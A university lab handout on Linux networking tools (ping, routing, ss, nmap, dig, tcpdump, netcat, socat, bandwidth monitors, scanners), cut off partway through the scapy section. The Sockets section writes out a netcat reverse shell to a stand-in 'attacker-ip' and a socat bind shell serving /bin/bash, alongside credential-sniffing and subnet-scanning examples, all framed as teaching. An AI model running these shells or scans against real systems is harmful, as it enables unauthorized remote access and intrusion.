# CSCI 497 – Linux Lab: 6. Networking Tools in Linux
*Part of Module 3: Networking Fundamentals*
 **Date**: July 18, 2025  
 **Duration**: 120 minutes (with 15-min break)
 **Theme**: Understanding how networks are logically segmented and how packets find their path, with a focus on subnetting, routing, and Linux tools for exploration and troubleshooting.
**Theme**: Exploring foundational networking tools in Linux, with practical usage for diagnostics, reconnaissance, and cybersecurity operations.

**Instructor:** Abdulrahman Azab Mohamed
 📧 [abdulrahman.azab@sigma2.no](mailto:abdulrahman.azab@sigma2.no)
 <img src="https://md.sigma2.no/uploads/8c82dd44-e7c7-49a1-a774-1de130d2856b.jpg" alt="Instructor: Abdulrahman Azab" width="80"/>

---
[TOC]

---

## 🔁 Recap from Previous Lecture

In Lecture 5, we learned about:

- 📦 **Subnetting** — dividing networks for security and scalability
- ✈️ **Routing** — how packets travel through networks
- 🧠 **NAT and gateways** — how internal devices talk to the internet
- 🔐 Security risks tied to misconfigured routing and subnetting
- 🧪 Explored traceroute, routing tables, and static routes

> Today we’ll **dig into the tools** that help us observe, test, and understand how traffic moves in Linux systems.

---

## 🛠️ Why Networking Tools Matter in Cybersecurity

- 🧪 Essential for **network diagnostics**
- 🧠 Helps identify open ports, services, or suspicious activity
- 🔐 Attackers and defenders use the **same tools** — understanding them is vital
- 🧰 Common in pen testing, incident response, and malware analysis

---

## 🌐 Categories of Networking Tools 

Understanding tool types helps you choose the right one for a task.

| 🧩 Category            | 🛠️ Examples                                                       | 💡 Use Case                                         |
|------------------------|--------------------------------------------------------------------|-----------------------------------------------------|
| **Connectivity**       | `ping`, `traceroute`, `mtr`, `arping`                             | Test if a host is reachable and route quality       |
| **Routing & Tables**   | `ip`, `route`, `ip rule`, `ip neigh`                              | View and manage how packets are routed              |
| **Ports & Services**   | `ss`, `netstat`, `nmap`, `lsof`, `fuser`                          | See which ports and services are active             |
| **DNS & Hostnames**    | `dig`, `nslookup`, `host`                                         | Resolve domains and debug DNS issues                |
| **Traffic Capture**    | `tcpdump`, `wireshark`, `tshark`, `ngrep`                         | Monitor and capture packets for analysis            |
| **Sockets & Data Transfer** | `nc`, `socat`, `curl`, `wget`, `telnet`, `ftp`, `scp`, `sftp`       | Send and receive data, simulate connections         |
| **Bandwidth Monitoring**| `iftop`, `vnstat`, `bmon`, `ip -s`, `nload`                      | Visualize real-time bandwidth usage                 |
| **Security Scanners**  | `nmap`, `masscan`, `hping3`, `tcping`, `nikto`, `amass`           | Probe and assess network surfaces                   |
| **Packet Crafting**    | `scapy`, `hping3`, `nping`                                        | Send custom packets for testing or evasion          |

> 🧠 **Pro Tip**: Hackers and analysts use the same tools. The difference is intent and awareness.

---

## 🔌 Lab: Connectivity Tools in Linux

**Tools Covered**: `ping`, `traceroute`, `mtr`, `arping`  
🧠 **Goal**: Learn how to verify network connectivity, trace network paths, and identify local reachability issues.

---

### 🧠 Why Use These Tools?

These are your first line of defense when troubleshooting:

| Tool        | Purpose                                 | Real-World Use Case                          |
|-------------|-----------------------------------------|----------------------------------------------|
| `ping`      | Check if a host is reachable            | Is google.com up? Is my DNS working?         |
| `traceroute`| Visualize the hops to a destination     | Why is my connection to a server so slow?    |
| `mtr`       | Combines ping + traceroute              | Ongoing monitoring of each hop’s performance |
| `arping`    | Check layer 2 (local network) reachability | Is the router responding in my subnet?     |

---

### 🧪 Step 1: Check Basic Internet Reachability

```bash
ping -c 4 google.com
````

🧾 **Expected Output**:

* 4 lines showing replies with latency (ms)
* Summary of packet loss and average time

📌 If you see `unknown host`, check DNS.
📌 If 100% packet loss, check internet or firewall.

---

### 🧪 Step 2: Trace the Route Your Packets Take

```bash
traceroute google.com
```

🧾 **What you'll see**:

* A list of routers (hops) between you and Google
* Latency from your machine to each hop

🔍 **Questions to explore**:

* How many hops did it take?
* Which hop seems slow or unreachable?
* Where is packet delay happening?

📌 Each hop = one router. If asterisks appear (`* * *`), that hop isn’t responding.

---

### 🧪 Step 3: Use `mtr` for Live, Continuous Tracing

```bash
sudo apt install mtr
mtr google.com
```

👀 MTR is interactive and combines ping + traceroute in real time.

🧾 **Watch for**:

* Which hops have the most **packet loss**?
* Which hops have the **highest latency**?

💡 Use the keyboard to scroll or pause.

📌 `mtr` is very helpful for **persistent performance issues** — better than just `ping`.

---

### 🧪 Step 4: Test Local Reachability with `arping`

```bash
sudo arping 192.168.1.1
```

🧾 Expected output:

* MAC address resolution attempts
* Response times

📌 Use only with IPs on your **local subnet** (Layer 2). This won't work for internet IPs.

💡 Helps identify:

* If local routers/switches are live
* If another host in your network is powered on

---

### 🎯 Summary of What Each Tool Tells You

| Tool         | Tells You...                                |
| ------------ | ------------------------------------------- |
| `ping`       | Can I reach this host? Is it up? How fast?  |
| `traceroute` | Which path do my packets take to get there? |
| `mtr`        | How is the path performing over time?       |
| `arping`     | Is this local device live on my LAN?        |

---

### 🔐 Security Context

| Scenario                     | Relevance                                              |
| ---------------------------- | ------------------------------------------------------ |
| Ping flood / DoS attack      | `ping` can be used to exhaust target’s bandwidth       |
| Traceroute exposure          | Shows your infrastructure path — useful to attackers   |
| MAC spoofing on LAN          | `arping` can be used for ARP cache poisoning detection |
| Path hijacking or BGP issues | `mtr` helps spot strange routing paths                 |

---

### 🧠 Challenge Questions

1. What happens if you `ping` a domain that doesn’t exist?
2. What’s the difference between `ping 8.8.8.8` and `ping google.com`?
3. If traceroute stops at hop 2, what might be the reason?
4. Can you ping your own IP address? Try it.
5. Use `arping` to test another VM on your network — what’s the MAC address?

---

### 🧪 Optional: Compare Real Output

Try these and compare:

```bash
ping -c 3 127.0.0.1       # Loopback ping
ping -c 3 $(hostname -I)  # Ping your own IP

traceroute 1.1.1.1        # Cloudflare DNS
traceroute github.com     # Watch the difference
```

What patterns do you see? What paths are shorter or longer?

---

## 🧭 Lab: Routing & Tables Tools in Linux

**Tools Covered**: `ip`, `route`, `ip rule`, `ip neigh`  
🧠 **Goal**: Understand how Linux handles routing decisions, lookup policies, and neighbor discovery — key for network troubleshooting and attack detection.

---

### 🌐 Why Routing Tools Matter in Cybersecurity

These tools help answer:

- "Where is this packet going?"
- "Which path does the system take?"
- "Is someone spoofing a neighbor?"
- "Why can’t I reach this network?"

🧱 Think of routing tables as **maps**, and these tools as your **compass and GPS**.

---

### 🧪 Step 1: Show the Routing Table

```bash
ip route
````

🧾 **Output Example**:

```
default via 192.168.1.1 dev eth0
192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.100
```

📌 Look for:

* **Default route** (`default via …`) — the gateway
* **Local subnet** entries — what interface is used
* **CIDR notation** (`/24`, `/16`, etc.)

🔍 **Questions**:

* What's your current **default gateway**?
* What subnet are you in?
* If you add a static route, does it show up here?

---

### 🧪 Step 2: Add and Delete Static Routes

```bash
sudo ip route add 10.10.10.0/24 via 192.168.1.1
ip route
```

✅ You should see the route added.

Now delete it:

```bash
sudo ip route del 10.10.10.0/24
```

📌 **Use case**: Defenders may use static routes for honeypots or VPNs. Attackers might misuse them to redirect traffic.

---

### 🧪 Step 3: Using `route` (Legacy)

```bash
route -n
```

🧾 This shows routing info in a classic table form:

| Destination | Gateway | Genmask | Interface |
| ----------- | ------- | ------- | --------- |

📌 Still used in many distros, good for legacy environments or exams.

---

### 🧪 Step 4: Routing Policy with `ip rule`

Linux supports **multiple routing tables** and rules.

Run:

```bash
ip rule show
```

🧾 **Example Output**:

```
0:	from all lookup local
32766:	from all lookup main
32767:	from all lookup default
```

🧠 This means:

* Lookup table `local` first (for loopbacks, etc.)
* Then `main` (your standard routes)
* Then `default` (last resort)

💡 Security use: Some malware installs **custom rules** to redirect DNS or proxy traffic.

---

### 🧪 Step 5: Inspect the ARP Table with `ip neigh`

```bash
ip neigh
```

🧾 Sample output:

```
192.168.1.1 dev eth0 lladdr 00:11:22:33:44:55 REACHABLE
```

| Field      | Meaning                               |
| ---------- | ------------------------------------- |
| IP Address | Neighbor's IP                         |
| dev        | Interface used                        |
| lladdr     | MAC address of the neighbor           |
| State      | Reachability (REACHABLE, STALE, etc.) |

📌 This shows what IPs your host is directly connected to at Layer 2.

---

### 🧪 Explore: Induce and Detect ARP Activity

1. Ping another machine:

```bash
ping 192.168.1.1
```

2. Check `ip neigh` — it should now list the device.

3. Disconnect/reconnect the network and recheck neighbor state.

💡 Suspicious MACs or lots of STALE entries may indicate **spoofing** or a **DoS attack**.

---

### 🔐 Cybersecurity Relevance

| Scenario                  | Why It Matters                                              |
| ------------------------- | ----------------------------------------------------------- |
| Custom routes inserted    | Malware redirecting traffic to C2 server                    |
| Modified ARP table        | Man-in-the-middle (MITM) or ARP poisoning                   |
| Policy-based routing used | Attackers using VPNs or tunnels inside compromised machines |
| Neighbor table flooding   | DoS via exhausting neighbor cache                           |

---

### 🧠 Questions to Explore

1. What does the `default via` entry in `ip route` mean?
2. How can you see if traffic is being redirected?
3. Can you spoof a MAC and show up in `ip neigh`?
4. What’s the difference between `ip route` and `route`?
5. What does a `FAILED` or `INCOMPLETE` state in `ip neigh` mean?

---

### 💡 Bonus: Monitor Route Changes Live

Install the necessary tools (if not already installed):

```bash
sudo apt update
sudo apt install iproute2
```

Then, in **Terminal 1**, start monitoring routing table changes:

```bash
ip monitor route
```

In **Terminal 2**, trigger some changes to observe live output:

```bash
# Add a temporary route (adjust the network and gateway to match your setup)
sudo ip route add 10.10.10.0/24 via 10.0.0.1 dev eth0

# Now delete it
sudo ip route del 10.10.10.0/24
```

You should see real-time updates like:

```
10.10.10.0/24 via 10.0.0.1 dev eth0
Deleted 10.10.10.0/24 via 10.0.0.1 dev eth0 
```

✅ This is a great way to **monitor dynamic routing events**, debug routing scripts, or observe behavior during VPN changes or network failover.

---

### 📸 Visual Summary of Routing Workflow

```text
[Your PC]
    |
    +-- Check routing policy (`ip rule`)
    |
    +-- Check routing table (`ip route`)
    |
    +-- Choose next hop
    |
    +-- Resolve MAC address via `ip neigh`
    |
    +-- Send packet out correct interface
```

---

## 🔍 Lab: Ports & Services Tools in Linux

**Tools Covered**: `ss`, `netstat`, `nmap`, `lsof`, `fuser`  
🎯 **Goal**: Learn how to inspect which processes are listening on which ports, identify active services, and detect suspicious activity.

---

### 🚪 Why Port & Service Visibility Matters

In cybersecurity, you must constantly ask:

- What services are running?
- Which ports are open?
- Who is listening on those ports?
- Are any backdoors or rogue listeners active?

🔐 **Many attacks involve exploiting or creating services**. Tools like `ss`, `lsof`, and `nmap` help spot them.

---

### 🧪 Step 1: Check Listening Ports with `ss`

```bash
ss -tuln
````

| Option | Meaning             |
| ------ | ------------------- |
| `-t`   | TCP sockets         |
| `-u`   | UDP sockets         |
| `-l`   | Listening only      |
| `-n`   | Don’t resolve names |

🧾 **Sample output**:

```
Netid State  Local Address:Port  Peer Address:Port
tcp   LISTEN 0.0.0.0:22          0.0.0.0:*
```

🔍 Interpretation:

* A service is listening on **port 22** (SSH)
* Listening on **all interfaces (0.0.0.0)** = exposed to outside

---

### 🧪 Step 2: Legacy Check with `netstat`

```bash
netstat -tuln
```

📌 `netstat` is deprecated but still widely used and appears in older systems or tools.

To list listening ports with programs:

```bash
sudo netstat -tulpn
```

🧠 Compare with `ss` — what’s different or missing?

---

### 🧪 Step 3: Scan with `nmap` (External View)

Install it if needed:

```bash
sudo apt install nmap
```

Now run:

```bash
sudo nmap -sT localhost
```

💡 **This simulates an attacker scanning your system**.

Try scanning another machine on your LAN if available:

```bash
sudo nmap 192.168.1.100
```

🧾 You'll see:

* Open TCP ports
* Services running on those ports
* Version guessing (`-sV`)

---

### 🧪 Step 4: Show Open Files with `lsof`

```bash
sudo lsof -i
```

| Option    | Meaning                             |
| --------- | ----------------------------------- |
| `-i`      | Show network files                  |
| `-i:80`   | Show processes using port 80        |
| `-u root` | Show processes owned by user `root` |

🧾 Sample output:

```
COMMAND  PID  USER  FD  TYPE  DEVICE  SIZE/OFF NODE NAME
sshd     598  root  3u  IPv4  12345   0t0      TCP *:22 (LISTEN)
```

💡 **Use case**: You can see exactly which command is listening on a port — essential for forensics.

---

### 🧪 Step 5: Kill a Service with `fuser`

```bash
sudo fuser -n tcp 22
```

🧾 This shows which **PID** is using port 22.

To force kill:

```bash
sudo fuser -k -n tcp 22
```

💣 Dangerous if used without care — **can drop SSH or web services!**

---

### 🔐 Cybersecurity Relevance

| Scenario                     | Why It Matters                               |
| ---------------------------- | -------------------------------------------- |
| Unknown service on port 1337 | Could be a backdoor or C2 server             |
| Service running as `root`    | Higher risk if exploited                     |
| Service bound to `0.0.0.0`   | Accessible from outside the host             |
| Zombie port (no PID)         | Could indicate a rootkit or stealthy process |

---

### 🧠 Questions to Explore

1. What does `ss -tuln` show that `nmap` doesn’t?
2. How do you tell if a port is open only to localhost?
3. Can you find which app is listening on port 80?
4. How would an attacker hide a service?
5. How can a defender discover a malicious listener?

---

### 🧪 Challenge Lab: Port & Service Audit

1. Start a simple web server:

```bash
python3 -m http.server 8080
```

2. Use:

   * `ss -tuln`
   * `lsof -i :8080`
   * `fuser -n tcp 8080`

3. Scan your machine:

```bash
nmap -sT localhost
```

4. Try binding to a privileged port (<1024) and observe permission denial unless run as root.

5. Write down:

   * All open ports and associated services
   * Any ports open to the internet
   * One way you might detect rogue activity

---

### 📌 Summary

✅ `ss` and `netstat` help inspect listening ports
✅ `lsof` and `fuser` let you **track and kill** suspicious services
✅ `nmap` simulates what attackers would see
✅ Understanding port usage is key to **hardening systems** and detecting **unauthorized activity**


---
## 🌐 Lab: DNS & Hostname Tools

**Tools Covered**: `dig`, `nslookup`, `host`  
🎯 **Goal**: Understand how to query DNS records, troubleshoot resolution issues, and detect DNS-based attacks.

---

### 🧠 Why DNS Matters in Cybersecurity

DNS (Domain Name System) is the internet's phonebook:

- Converts domain names like `google.com` into IP addresses.
- DNS manipulation is common in phishing, spoofing, and command-and-control attacks.

🔐 Knowing how to inspect and understand DNS is **crucial for analysts** and defenders.

---

### 📌 DNS Records Refresher

| Record Type | Purpose                          | Example                              |
|-------------|----------------------------------|--------------------------------------|
| A           | Maps hostname to IPv4            | `google.com → 142.250.186.206`       |
| AAAA        | Maps hostname to IPv6            | `google.com → 2607:f8b0::200e`       |
| MX          | Mail exchange server             | `mail.google.com`                    |
| NS          | Nameserver for a domain          | `ns1.google.com`                     |
| TXT         | Text data (SPF, verification)    | `v=spf1 include:_spf.google.com ...` |
| CNAME       | Alias to another name            | `www.example.com → example.com`      |

---

### 🧪 Step 1: Query DNS with `dig`

```bash
dig google.com
````

🧾 Output includes:

* Question and Answer section
* Nameserver and authority information
* Query time and server used

Try specific records:

```bash
dig A google.com
dig MX gmail.com
dig TXT google.com
```

💡 Cybersecurity tip: Check `TXT` records to verify SPF/DKIM setups or potential misconfigs.

---

### 🧪 Step 2: Reverse Lookup

```bash
dig -x 8.8.8.8
```

📌 This is how to find the domain associated with an IP — useful for threat intel or tracking malware servers.

---

### 🧪 Step 3: Use `nslookup` (Older Tool, Still Useful)

```bash
nslookup google.com
```

Try this:

```bash
nslookup
> set type=MX
> gmail.com
```

🧠 Older interface, but still in use and good for scripts or environments without `dig`.

---

### 🧪 Step 4: Use `host` (Simple and Fast)

```bash
host google.com
```

Try:

```bash
host -t mx gmail.com
host -t ns google.com
host -a google.com  # Query all records
```

✅ Great for quick lookups or during live incident response.

---

### 🔐 Cybersecurity Use Cases

| Scenario                         | Tool & Use                              |
| -------------------------------- | --------------------------------------- |
| Domain spoofing                  | Check `A`, `MX`, and `TXT` records      |
| Phishing domain investigation    | Run `dig`, `whois`, and reverse lookups |
| DNS tunneling (C2) detection     | Identify abnormal `TXT` or `NS` entries |
| Check public exposure of systems | Use `host` or `dig` on subdomains       |

---

### 🧠 Questions to Explore

1. What is the difference between `A` and `CNAME` records?
2. Why is the `MX` record important for email security?
3. What kind of record might an attacker abuse to exfiltrate data via DNS?
4. What does a `TXT` record with `v=spf1` indicate?
5. Can DNS help identify the infrastructure of a phishing campaign?

---

### 🧪 Challenge Lab: DNS Threat Hunt

1. Choose a suspicious-looking domain (e.g. `xfil3-m4il.xyz`)
2. Run:

```bash
dig xfil3-m4il.xyz
dig -t TXT xfil3-m4il.xyz
dig -x [IP from above]
```

3. Look for:

   * Strange IPs or registrars
   * TXT records with base64 or suspicious strings
   * No `MX` records (fake email domains)

4. Try a known domain (like `gmail.com`) and compare answers.

---

### 📌 Summary

✅ `dig` is the most powerful and flexible DNS tool
✅ `nslookup` is simple and good for quick checks
✅ `host` is fast and script-friendly
✅ Knowing DNS record types helps with malware detection, phishing defense, and digital forensics

---
## 🧲 Lab: Traffic Capture Tools

**Tools Covered**: `tcpdump`, `wireshark`, `tshark`, `ngrep`  
🎯 **Goal**: Learn how to inspect live and captured network traffic, filter relevant packets, and detect anomalies.

---

### 🧠 Why Capture Network Traffic?

Traffic capture lets analysts:

- **Inspect suspicious traffic**
- Investigate **malware callbacks**
- Analyze **data exfiltration techniques**
- Understand normal vs. abnormal behavior

> 🔐 It's a cornerstone of **network forensics** and **incident response**.

---

### 🧪 Step 1: Capture with `tcpdump`

```bash
sudo tcpdump -i any
````

📌 Captures all packets on all interfaces. Press `Ctrl+C` to stop.

Save capture to file:

```bash
sudo tcpdump -i any -w traffic.pcap
```

🔍 Open `traffic.pcap` later in `wireshark` or inspect with:

```bash
tcpdump -nn -r traffic.pcap
```

#### 🎯 Useful Filters

```bash
tcpdump port 80            # Only HTTP
tcpdump host 8.8.8.8       # Traffic to/from specific IP
tcpdump udp port 53        # DNS traffic
```

> 🔎 Use filters to **narrow down** investigation focus.

---

### 🧪 Step 2: Analyze with `wireshark`

Launch Wireshark:

```bash
sudo wireshark
```

Steps:

1. Choose the correct interface (e.g. `eth0`, `wlan0`)
2. Click **Start Capture**
3. Stop after 30 seconds
4. Apply filters like:

   * `http`
   * `ip.addr == 192.168.1.10`
   * `dns`
   * `tcp.port == 4444`

🧠 Tip: Use the “Follow TCP Stream” feature to inspect session data (e.g., cleartext passwords, malware C2 commands).

---

### 🧪 Step 3: CLI Analysis with `tshark`

`tshark` = **Wireshark’s terminal-based version**

```bash
sudo tshark -i any
```

Capture and filter:

```bash
sudo tshark -i any -Y "dns" -T fields -e ip.src -e dns.qry.name
```

🔎 Extract structured info (e.g. just IPs and queried domains).

---

### 🧪 Step 4: Inspect Payloads with `ngrep`

Like `grep`, but for **network traffic**

```bash
sudo ngrep -d any "password" port 80
```

💥 See if passwords or secrets are sent in plain text!

Other examples:

```bash
sudo ngrep -d any -W byline "Host:" tcp
sudo ngrep -d any -q -t "^POST" port 80
```

> ⚠️ Used to detect **credential leakage**, **unauthorized APIs**, or **plain-text logins**.

---

### 🔐 Security Use Cases

| Scenario                      | Tool        | Example Use                                   |
| ----------------------------- | ----------- | --------------------------------------------- |
| Detect malware C2 callback    | `tcpdump`   | Filter for outbound TCP port 4444             |
| Inspect phishing payload      | `wireshark` | Reassemble email from SMTP traffic            |
| Track DNS tunneling           | `tshark`    | Filter DNS traffic and dump TXT record data   |
| Search for leaked credentials | `ngrep`     | Search HTTP streams for `username=` or `pwd=` |

---

### 🧪 Challenge Lab: Threat Detection with Packet Tools

1. Start a packet capture:

```bash
sudo tcpdump -i any -w suspicious.pcap
```

2. In another terminal, generate traffic:

```bash
curl ifconfig.me
ping -c 4 google.com
nc -nv example.com 443
```

3. Stop capture and open in `wireshark`

4. Tasks:

* Identify which IP accessed `ifconfig.me`
* Inspect the DNS resolution process
* Look for any TCP handshake (SYN, SYN-ACK, ACK)
* Extract any suspicious payload

5. Bonus:

* Use `tshark` to list DNS queries only
* Use `ngrep` to search for “curl” or “nc”

---

### 🧠 Analyst Tips

* **Use filters to reduce noise**. A full capture can be massive.
* **Capture files are evidence** — store safely.
* Learn to correlate packet data with **host activity** (processes, logs, etc.)
* **Document what you find**, including timestamps, source/dest, and potential threats.

---

### ✅ Summary

| Tool        | Best For                            |
| ----------- | ----------------------------------- |
| `tcpdump`   | Lightweight, fast capture           |
| `wireshark` | Deep, graphical analysis            |
| `tshark`    | Scriptable CLI version of Wireshark |
| `ngrep`     | Find keywords in live packet data   |

> Understanding network traffic is critical for **detecting attacks**, **investigating incidents**, and **proving root cause**.


---
## 🔌 Lab: Sockets & Data Transfer Tools

**Tools Covered**: `nc`, `socat`, `curl`, `wget`, `telnet`, `ftp`, `scp`, `sftp`  
🎯 **Goal**: Learn how Linux communicates over sockets, how files are transferred, and how attackers use and abuse these tools.

---

### 🧠 Why Learn Socket Tools?

Socket tools let you:

- **Transfer files** between systems
- **Create tunnels**, relays, or backdoors
- **Interact with services** directly (e.g. HTTP, FTP)
- Simulate both **client** and **server**

> 🛡️ Understanding them helps you **secure services** and **detect misuse**.

---

### 🧪 Step 1: `nc` – Netcat

#### 1. Transfer files (locally or remotely):

**Sender**:

```bash
nc -lvp 4444 < secret.txt
````

**Receiver**:

```bash
nc localhost 4444 > received.txt
```

✅ Try sending a script, image, or `.txt` file between two terminals.

#### 2. Reverse Shell Simulation (⚠️ Controlled environment only):

**Attacker (listener)**:

```bash
nc -lvp 4444
```

**Victim (reverse shell)**:

```bash
nc attacker-ip 4444 -e /bin/bash
```

> 🔍 This is how **backdoors** and **remote access** work in attacks.

---

### 🧪 Step 2: `socat` – Netcat on steroids

```bash
socat TCP-LISTEN:1234,reuseaddr,fork EXEC:/bin/bash
```

Connect from another terminal:

```bash
nc localhost 1234
```

🎯 `socat` can also forward ports or bridge between protocols.

Example: Forward local port 8000 to remote 80

```bash
socat TCP-LISTEN:8000,fork TCP:remote.com:80
```

---

### 🧪 Step 3: `curl` and `wget`

#### 🌀 curl

* Fetch a webpage:

```bash
curl http://example.com
```

* POST data:

```bash
curl -X POST -d "username=admin&password=123" http://site.com/login
```

🎯 Try sending data to a requestbin.com webhook!

#### 📥 wget

```bash
wget http://example.com/file.zip
```

Add `--no-check-certificate` for HTTPS downloads without trusted certs.

🔍 Try downloading a file in `/tmp` and inspecting with `file`.

---

### 🧪 Step 4: `telnet` – Old but Useful

```bash
telnet towel.blinkenlights.nl
```

💡 This command plays Star Wars over Telnet.

Use it to test open ports:

```bash
telnet google.com 80
```

Then type:

```http
GET / HTTP/1.1
Host: google.com
```

✅ See raw HTTP responses — useful in **web forensics** or **header inspection**.

---

### 🧪 Step 5: FTP, SCP, and SFTP

#### FTP (Insecure – Use only for practice)

Connect:

```bash
ftp speedtest.tele2.net
```

Download test files:

```bash
get 100MB.zip
```

> ⚠️ Credentials are sent in plaintext! Watch traffic with `tcpdump`.

#### SCP – Secure Copy (SSH-based)

```bash
scp file.txt user@remote:/tmp/
```

Or pull from remote:

```bash
scp user@remote:/var/log/syslog .
```

#### SFTP – Secure FTP over SSH

```bash
sftp user@remote
sftp> ls
sftp> get secret.txt
sftp> put upload.sh
```

> 🔐 Often used in **secure automation**, backups, or remote access.

---

### 🔐 Security Use Cases

| Scenario                  | Tool            | Analyst Task                                   |
| ------------------------- | --------------- | ---------------------------------------------- |
| Reverse shell or backdoor | `nc`, `socat`   | Detect suspicious listeners or outbound shells |
| Credential sniffing       | `ftp`, `telnet` | Use `tcpdump` to inspect cleartext credentials |
| Exfiltration via HTTP     | `curl`, `wget`  | Monitor outbound uploads, alert on POST data   |
| Legitimate remote ops     | `scp`, `sftp`   | Check logs for secure transfer integrity       |

---

### 🧪 Challenge Lab: Transfer & Detect

1. On your Kali Linux machine:

Start listener:

```bash
nc -lvp 9999 > received.sh
```

2. In another terminal:

```bash
echo 'echo hello' > payload.sh
nc localhost 9999 < payload.sh
```

3. Inspect:

* Was the file transferred?
* What did `tcpdump` capture?

4. Try:

* `curl` a public file
* `telnet` to a web server
* `scp` or `sftp` to a remote machine (if SSH is set up)

---

### ✅ Summary

| Tool     | Use Case                          |
| -------- | --------------------------------- |
| `nc`     | Port scan, shell, file transfer   |
| `socat`  | Advanced socket operations        |
| `curl`   | HTTP requests, API testing        |
| `wget`   | File downloads                    |
| `telnet` | Service interaction & diagnostics |
| `ftp`    | Legacy file transfer              |
| `scp`    | Secure copy over SSH              |
| `sftp`   | Secure FTP with better control    |

> Analysts must **monitor usage**, detect **abuse patterns**, and **understand legitimate cases**.


---
## 📶 Lab: Bandwidth Monitoring Tools in Linux

**Tools Covered**: `iftop`, `vnstat`, `bmon`, `ip -s`, `nload`  
🎯 **Goal**: Learn to monitor bandwidth usage in real-time, identify high-traffic sources/destinations, and understand how bandwidth insights help in cybersecurity investigations.

---

### 🧠 Why Monitor Bandwidth?

Bandwidth monitoring helps you:

- Detect **unusual traffic spikes**
- Investigate **data exfiltration**
- Audit **network performance**
- Identify **high-usage processes** or IPs

> 🛡️ Excessive bandwidth usage could mean data leaks, malware communication, or a misconfigured service.

---

### 🧪 Step 1: `iftop` – Real-Time Bandwidth Viewer

```bash
sudo apt install iftop
sudo iftop -i eth0
````

> Replace `eth0` with your actual interface (`ip a` to find out).

Features:

* See top bandwidth-consuming **IP pairs**
* View **source/destination**, **rates**, and **totals**

✅ Sort traffic by pressing keys like `t`, `S`, `D`, `T` for different views.

> 🧠 Use `iftop` when investigating **suspicious outbound connections**.

---

### 🧪 Step 2: `vnstat` – Historical Bandwidth Usage

```bash
sudo apt install vnstat
sudo vnstat -u -i eth0   # Initialize interface
```

Track usage:

```bash
vnstat                 # Summary
vnstat -d              # Daily usage
vnstat -h              # Hourly graph
vnstat -l              # Live mode
```

> 🔍 Helps **correlate traffic with attack timelines**.

---

### 🧪 Step 3: `bmon` – Bandwidth Visualizer

```bash
sudo apt install bmon
sudo bmon
```

Features:

* **Graphical interface** (TUI)
* See per-interface traffic
* Press `d` for more details

🧠 Use case: Identify which NIC is overloaded or active during an incident.

---

### 🧪 Step 4: `ip -s` – Built-in Traffic Counter

```bash
ip -s link
```

Output:

```text
2: eth0: <UP, ...>
    RX: bytes  packets  errors  dropped
    TX: bytes  packets  errors  dropped
```

✅ This shows how many bytes were **received (RX)** and **transmitted (TX)** per interface.

> 🔍 Use for **quick checks** or when tools are not installed.

---

### 🧪 Step 5: `nload` – Text-Based Network Monitor

```bash
sudo apt install nload
sudo nload eth0
```

📊 Shows **incoming and outgoing traffic** as ASCII graphs

Features:

* Live graphs
* Speed (kB/s)
* Total usage

🎯 Great for **visualizing a file transfer, attack, or large download** in real-time.

---

### 🔐 Cybersecurity Use Cases

| Scenario                    | Tool     | Insight Gained                                 |
| --------------------------- | -------- | ---------------------------------------------- |
| Data exfiltration detected  | `iftop`  | See IPs sending large amounts of data          |
| Suspicious activity spike   | `vnstat` | Check if bandwidth usage was abnormal that day |
| Port scan or worm spread    | `bmon`   | Spikes in transmitted packets                  |
| Headless systems auditing   | `ip -s`  | Track usage on servers with no GUI             |
| Real-time attack visibility | `nload`  | Watch bandwidth usage during simulation        |

---

### 🧪 Challenge Lab: Spot the Bandwidth Spike

1. Open 2 terminals side-by-side.

2. In terminal A, run:

```bash
sudo iftop -i eth0
```

3. In terminal B, simulate traffic:

```bash
wget http://speed.hetzner.de/100MB.bin
```

4. Observe traffic in `iftop`.

5. Try:

* `vnstat -l`
* `bmon`
* `nload`

6. Analyze:

* What IP is serving the file?
* What interface was used?
* Were spikes detected?

---

### ✅ Summary

| Tool     | Key Use Case                           |
| -------- | -------------------------------------- |
| `iftop`  | Real-time connection tracking          |
| `vnstat` | Historical bandwidth auditing          |
| `bmon`   | Visual overview per interface          |
| `ip -s`  | Quick built-in stats                   |
| `nload`  | Minimalistic real-time traffic display |

> Analysts should monitor both **instantaneous and long-term usage** to spot breaches and prevent data leaks.


---
## 🛡️ Lab: Security Scanners & Packet Crafting Tools

**Categories Covered**:
- 🔍 Security Scanners: `nmap`, `masscan`, `hping3`, `tcping`, `nikto`, `amass`
- 🧪 Packet Crafting: `scapy`, `hping3`, `nping`

🎯 **Goal**: Learn how to discover hosts, ports, vulnerabilities, and simulate malicious or diagnostic traffic patterns.

---

### 🔍 Part 1: Security Scanners

These tools **scan** networks and services for **open ports**, **running services**, and **security weaknesses**.

---

#### 🧪 Tool: `nmap` – The Network Mapper

Install:
```bash
sudo apt install nmap
````

Common scans:

```bash
nmap -sS 192.168.1.0/24          # TCP SYN scan
nmap -sU -p 53 192.168.1.10      # UDP port scan
nmap -A 192.168.1.10             # OS detection, services, scripts
```

✅ Use for: Discovering devices, fingerprinting services, detecting weak protocols

---

#### 🧪 Tool: `masscan` – Fast Internet-Wide Scanner

Install:

```bash
sudo apt install masscan
```

Scan an entire subnet:

```bash
sudo masscan 192.168.1.0/24 -p1-1000 --rate=1000
```

⚠️ Masscan is extremely fast. Limit your rate on local networks.

> Great for **high-speed scans**, like when hunting exposed ports across ranges.

---

#### 🧪 Tool: `tcping` – Ping over TCP

Install:

```bash
sudo apt install tcping
```

Example:

```bash
tcping google.com 80
```

✅ Tests if a port is open and responsive (unlike ICMP ping).

---

#### 🧪 Tool: `nikto` – Web Server Vulnerability Scanner

Install:

```bash
sudo apt install nikto
```

Scan a local web server:

```bash
nikto -h http://localhost:8080
```

✅ Identifies insecure HTTP headers, outdated software, and known vulnerabilities.

---

#### 🧪 Tool: `amass` – Subdomain Enumeration

Install:

```bash
sudo snap install amass
```

Run:

```bash
amass enum -d example.com
```

✅ Discover subdomains via passive and active DNS reconnaissance.

---

### 🧪 Security Scanner Lab Exercise

1. Start a local HTTP server:

   ```bash
   python3 -m http.server 8080
   ```

2. Run:

   * `nmap -sV localhost -p 8080`
   * `tcping localhost 8080`
   * `nikto -h http://localhost:8080`

3. Observe:

   * What ports are open?
   * What services are running?
   * Did `nikto` find anything?

---

### 🔬 Part 2: Packet Crafting Tools

These tools help you **manually create** or modify packets to simulate attacks or test defenses.

---

#### 🧪 Tool: `scapy` – Python Packet Lab

Install:

```bash
sudo apt install scapy
```

Start interactive mode:

```bash
sudo scapy
```

Send a custom ICMP packet:

```python
send(IP(dst="8.8.8.8")/ICMP())
```

Craft TCP SYN:

```python
